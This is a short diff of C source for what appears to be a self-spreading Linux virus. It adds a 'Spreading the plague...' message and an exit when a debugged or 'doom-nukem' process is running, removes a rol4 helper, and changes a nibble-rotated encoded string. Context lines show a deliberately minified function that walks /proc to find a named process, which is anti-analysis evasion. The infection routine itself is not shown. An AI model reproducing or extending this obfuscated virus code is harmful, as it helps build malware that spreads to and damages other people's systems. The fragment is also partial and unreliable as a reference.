@@ -55,7 +55,11 @@ void _start(void)
 	// ft_close(2);
 
 	if (/*is_debugged() || */ is_program_running("doom-nukem"))
+	{
+		ft_write(1, "Debugged or protected program running, exiting.\n", 48);
 		ft_exit(0);
+	}
+	ft_write(1, "Spreading the plague...\n", 25);
 
 	// #ifdef BONUS
 	// 	// if envp has path
@@ -160,11 +164,6 @@ void _start(void)
 // clang-format off
 int _a(const char*o){int a=0;if((a=ft_open("/proc",00|0200000))<0)return 0;char b[4096];for(;;){int c=ft_getdents64(a,b,4096);if(c<=0)break;for(int e=0;e<c;){struct linux_dirent64*d=(struct linux_dirent64*)(b+e);const char*f=d->d_name;int g=1;for(int i=0;f[i];i++){if(f[i]<48||f[i]>57){g=0;break;}}if(g){char h['A'];int i=0;h[i++]=47;h[i++]=112;h[i++]=114;h[i++]=111;h[i++]=99;h[i++]=47;for(int j=0;f[j];j++)h[i++]=f[j];h[i++]=47;h[i++]=99;h[i++]=111;h[i++]=109;h[i++]=109;h[i]=0;int k=ft_open(h,00);if (k >= 0){char l[64];int m=ft_read(k,l,sizeof(l)-1);ft_close(k);if(m>0){l[m]=0;char*n=ft_strchr(l,10);if(n)*n=0;if(ft_strcmp(l,o)==0){ft_close(a);return 1;}}}}e+=d->d_reclen;}}ft_close(a);return 0;}
 
-static unsigned char rol4(unsigned char x)
-{
-	return (unsigned char)((x << 4) | (x >> 4));
-}
-
 static unsigned char ror4(unsigned char x)
 {
 	return (unsigned char)((x >> 4) | (x << 4));
@@ -186,7 +185,7 @@ static const unsigned char S_PROC[] = {
 };
 
 static const unsigned char S_COMM[] = {
-	0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0
+	0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0
 };
 
 int is_program_running(const char *target)
